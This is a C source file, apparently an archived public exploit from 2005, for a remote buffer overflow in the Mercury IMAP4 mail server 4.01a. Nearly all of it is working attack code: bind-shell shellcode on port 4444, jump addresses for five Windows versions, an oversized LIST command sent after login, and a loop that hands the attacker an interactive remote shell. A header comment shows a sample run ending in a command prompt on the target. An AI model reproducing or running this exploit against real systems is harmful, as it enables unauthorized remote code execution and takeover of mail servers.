/*   
     Mercury imap4 server remote buffer overflow exploit
     author : c0d3r "kaveh razavi" c0d3r@ihsteam.com c0d3r@c0d3r.org
     package : Mercury mail transport system 4.01a and prolly prior
     workaround : upgrade to 4.01b version
     advisory : not available right now 
     company address : www.pmail.com
     timeline :
     15 Sep 2005 : vulnerability reported by securiteam mailing list
     20 Sep 2005 : IHS exploit released 
     exploit features :
     1) 5 working targets including win2k , winxp , win2k3
     2) reliable metasploit shellcode
     3) autoconnect to shell
     bad chars are : 0x20 0x0a 
     compiled with visual c++ 6 : cl mercury_imap.c 
     greeting to :
     www.ihsteam.com       the team , LorD and NT heya
     www.ihsteam.net       english version ,
     www.exploitdev.com    Jamie and Ben the two good brothers also my brothers
     www.metasploit.com    when are you gonna release the newer version :P ?
     www.class101.org      class with his new laptop :>
     www.milw0rm.com       str0ke , I am sending it to you first dont doubt :d 
     www.c0d3r.org         study time started :((( , pitty for the c0d3r !
     shout to actionspider 
     read these lines and try to understand ( I know you cant akhey ) that 
     an script kiddie (defacer) never ever could be compared to an exploit coder
     try to grow , being grown up is not related to age  -- with respects 
/*
/*

D:\projects>mercury_imap.exe ihs 143 4 c0d3r abc

-------- mercury imap remote BOF exploit by c0d3r

[+] target : windows 2003 server enterprise service pack 1
[+] building login data
[+] building overflow string
[+] attacking host ihs
[+] packet size = 625 byte
[+] connected
[+] sending login info
[+] sending exploit string
[+] exploit sent successfully to ihs
[+] trying to get shell
[+] connecting to ihs on port 4444
[+] target exploited successfully
[+] Dropping into shell

Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

H:\MERCURY>

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#pragma comment(lib, "ws2_32.lib")
#define NOP 0x90
#define size 625
// nops + return address + 16 nops + shellcode 260 + 4 + 16 + 344 + 1   


// metasploit shellcode LPORT=4444 Size=344 Encoder=PexFnstenvSub
// bad chars : 0x00 0x0a 0x20 0x0d

char shellcode[]=
"\x33\xc9\x83\xe9\xb0\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x92"
"\xc9\xd2\x3b\x83\xeb\xfc\xe2\xf4\x6e\xa3\x39\x76\x7a\x30\x2d\xc4"
"\x6d\xa9\x59\x57\xb6\xed\x59\x7e\xae\x42\xae\x3e\xea\xc8\x3d\xb0"
"\xdd\xd1\x59\x64\xb2\xc8\x39\x72\x19\xfd\x59\x3a\x7c\xf8\x12\xa2"
"\x3e\x4d\x12\x4f\x95\x08\x18\x36\x93\x0b\x39\xcf\xa9\x9d\xf6\x13"
"\xe7\x2c\x59\x64\xb6\xc8\x39\x5d\x19\xc5\x99\xb0\xcd\xd5\xd3\xd0"
"\x91\xe5\x59\xb2\xfe\xed\xce\x5a\x51\xf8\x09\x5f\x19\x8a\xe2\xb0"
"\xd2\xc5\x59\x4b\x8e\x64\x59\x7b\x9a\x97\xba\xb5\xdc\xc7\x3e\x6b"
"\x6d\x1f\xb4\x68\xf4\xa1\xe1\x09\xfa\xbe\xa1\x09\xcd\x9d\x2d\xeb"
"\xfa\x02\x3f\xc7\xa9\x99\x2d\xed\xcd\x40\x37\x5d\x13\x24\xda\x39"
"\xc7\xa3\xd0\xc4\x42\xa1\x0b\x32\x67\x64\x85\xc4\x44\x9a\x81\x68"
"\xc1\x9a\x91\x68\xd1\x9a\x2d\xeb\xf4\xa1\xc3\x67\xf4\x9a\x5b\xda"
"\x07\xa1\x76\x21\xe2\x0e\x85\xc4\x44\xa3\xc2\x6a\xc7\x36\x02\x53"
"\x36\x64\xfc\xd2\xc5\x36\x04\x68\xc7\x36\x02\x53\x77\x80\x54\x72"
"\xc5\x36\x04\x6b\xc6\x9d\x87\xc4\x42\x5a\xba\xdc\xeb\x0f\xab\x6c"
"\x6d\x1f\x87\xc4\x42\xaf\xb8\x5f\xf4\xa1\xb1\x56\x1b\x2c\xb8\x6b"
"\xcb\xe0\x1e\xb2\x75\xa3\x96\xb2\x70\xf8\x12\xc8\x38\x37\x90\x16"
"\x6c\x8b\xfe\xa8\x1f\xb3\xea\x90\x39\x62\xba\x49\x6c\x7a\xc4\xc4"
"\xe7\x8d\x2d\xed\xc9\x9e\x80\x6a\xc3\x98\xb8\x3a\xc3\x98\x87\x6a"
"\x6d\x19\xba\x96\x4b\xcc\x1c\x68\x6d\x1f\xb8\xc4\x6d\xfe\x2d\xeb"
"\x19\x9e\x2e\xb8\x56\xad\x2d\xed\xc0\x36\x02\x53\x62\x43\xd6\x64"
"\xc1\x36\x04\xc4\x42\xc9\xd2\x3b";


  void gotshell (int newsock);
  unsigned int rc,sock,os,addr,rc2 ;
  struct sockaddr_in tcp;
  struct hostent *hp;
  WSADATA wsaData;
  char buffer[size];
  char point_esp[5];
  unsigned short port;
  char req1[] =  "\x30\x30\x30\x30\x20\x4C\x4F\x47\x49\x4E";
  char req2[] =  "\x30\x30\x30\x31";
  unsigned char *login,*exploit;
  char vuln_command[] = "\x4C\x49\x53\x54";
  char winxpsp1[]   = "\xCC\x59\xFB\x77"; // jmp esp in ntdll
  char winxpsp2[]   = "\xED\x1E\x94\x7C"; // jmp esp (not tested)
  char win2ksp4[]   = "\x23\xde\xaf\x01"; // call esp in kernel32.dll
  char win2k3_sp0[] = "\xAB\x8B\xFB\x77"; // jmp esp in ntdll
  char win2k3_sp1[] = "\x6A\xFA\xE8\x77"; // push esp - ret in kernel32
                    
 int main (int argc, char *argv[]){
  
	
 if(argc < 6) {
 printf("\n-------- mercury imap remote BOF exploit by c0d3r\n");
 printf("-------- usage : imap.exe host port target username password\n");
 printf("-------- target 1 : windows xp service pack 1         : 0\n");
 printf("-------- target 2 : windows xp service pack 2         : 1\n");
 printf("-------- target 3 : windoes 2k advanced server sp 4   : 2\n");
 printf("-------- target 4 : windoes 2k3 server enterprise sp0 : 3\n");
 printf("-------- target 5 : windoes 2k3 server enterprise sp1 : 4\n");
 printf("-------- eg : imap.exe 127.0.0.1 143 0 c0d3r abc\n\n");	
 exit(-1) ;
  } 
  printf("\n-------- mercury imap remote BOF exploit by c0d3r\n\n");
 os = (unsigned short)atoi(argv[3]); 	 
  switch(os)
  {
   case 0:
    strcat(point_esp,winxpsp1);
    printf("[+] target : windows xp service pack 1\n");
	break;
   case 1:
    strcat(point_esp,winxpsp2); 
    printf("[+] target : windows xp service pack 2\n");
	break;
   case 2:
    strcat(point_esp,win2ksp4); 
    printf("[+] target : windows 2000 advanced server service pack 4\n");
	break;
   case 3:
	strcat(point_esp,win2k3_sp0);
	printf("[+] target : windows 2003 server enterprise service pack 0\n");
	break;
   case 4:
	strcat(point_esp,win2k3_sp1);
	printf("[+] target : windows 2003 server enterprise service pack 1\n");
	break;
   default:
    printf("\n[-] this target doesnt exist in the list\n\n");
   
    exit(-1);
  }  
	
  printf("[+] building login data\n");
  login = malloc(256);
  memset(login,0,256);
  sprintf(login,"%s %s %s\r\n",req1,argv[4],argv[5]);

    // Creating heart of exploit code 4 5
  
    printf("[+] building overflow string");
  
    memset(buffer,NOP,size);
    memcpy(buffer+260,point_esp,sizeof(point_esp)-1);
    memcpy(buffer+280,shellcode,sizeof(shellcode)-1);
    buffer[size] = 0;
    exploit = malloc(1000);
    memset(exploit,0,1000);
    sprintf(exploit,"%s %s %s\r\n",req2,vuln_command,buffer);
	
   // EO heart of exploit code 

  
			if (WSAStartup(MAKEWORD(2,1),&wsaData) != 0){
   printf("[-] WSAStartup failed !\n");
   exit(-1);
  }
	hp = gethostbyname(argv[1]);
  Sleep(1500);
  if (!hp){
   addr = inet_addr(argv[1]);
  }
  if ((!hp)  && (addr == INADDR_NONE) ){
   printf("[-] unable to resolve %s\n",argv[1]);
   exit(-1);
  }
  sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
  if (!sock){ 
   printf("[-] socket() error...\n");
   exit(-1);
  }
	  if (hp != NULL)
   memcpy(&(tcp.sin_addr),hp->h_addr,hp->h_length);
  else
   tcp.sin_addr.s_addr = addr;

  if (hp)
   tcp.sin_family = hp->h_addrtype;
  else
  tcp.sin_family = AF_INET;
  port=atoi(argv[2]);
  tcp.sin_port=htons(port);
   
  
  printf("\n[+] attacking host %s\n" , argv[1]) ;
  
  Sleep(1000);
  
  printf("[+] packet size = %d byte\n" , sizeof(buffer));
  
  rc=connect(sock, (struct sockaddr *) &tcp, sizeof (struct sockaddr_in));
  if(rc==0)
  {
    
     Sleep(1500) ;
     printf("[+] connected\n") ;
     printf("[+] sending login info\n") ;
     send(sock,login,strlen(login),0);
     Sleep(1500);
     printf("[+] sending exploit string\n") ;
     send(sock,exploit,strlen(exploit),0);
     Sleep(1500);
     printf("[+] exploit sent successfully to %s \n" , argv[1]);
     printf("[+] trying to get shell\n");
     printf("[+] connecting to %s on port 4444\n",argv[1]);
     sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
     Sleep(1500);
     if (!sock){ 
     printf("[-] socket() error...\n");
     exit(-1);
	 }
	 tcp.sin_family = AF_INET;
	 tcp.sin_port=htons(4444);
	 rc2=connect(sock, (struct sockaddr *) &tcp, sizeof (struct sockaddr_in));
     if(rc2 != 0) {
	 printf("[-] exploit probably failed\n");
	 exit(-1);
	 }
     if(rc2==0)
	 {
	  printf("[+] target exploited successfully\n");
      printf("[+] Dropping into shell\n\n");
	 gotshell(sock);
	 }
  } 
  
  else {
      printf("[-] ouch! Server is not listening .... \n");
 }
  shutdown(sock,1);
  closesocket(sock);
  }
   void gotshell(int new_sock)  
	{
  struct timeval tv;
  int length;
  unsigned long o[2];
  char bufferx[1000];

  tv.tv_sec = 1;
  tv.tv_usec = 0;

  while (1) {
	
	o[0] = 1;
	o[1] = new_sock; 

	length = select (0, (fd_set *)&o, NULL, NULL, &tv);
	if(length == 1)
		{
	length = recv (new_sock, bufferx, sizeof (bufferx), 0);
	if (length <= 0) 
		{
	printf ("[-] Connection closed.\n");
	WSACleanup();
	return;
		}
	length = write (1, bufferx, length);
	if (length <= 0) 
		{
	printf("[-] Connection closed.\n");
	WSACleanup();
	return;
		}
		}
	else
	{
	length = read (0, bufferx, sizeof (bufferx));
	if (length <= 0) 
		{
	printf("[-] Connection closed.\n");
	WSACleanup();
	return;
		}
	length = send(new_sock, bufferx, length, 0);
	if (length <= 0) 
	{
	printf("[-] Connection closed.\n");
	WSACleanup();
	return;
				}
			}
		}
   }

// milw0rm.com [2005-09-20]
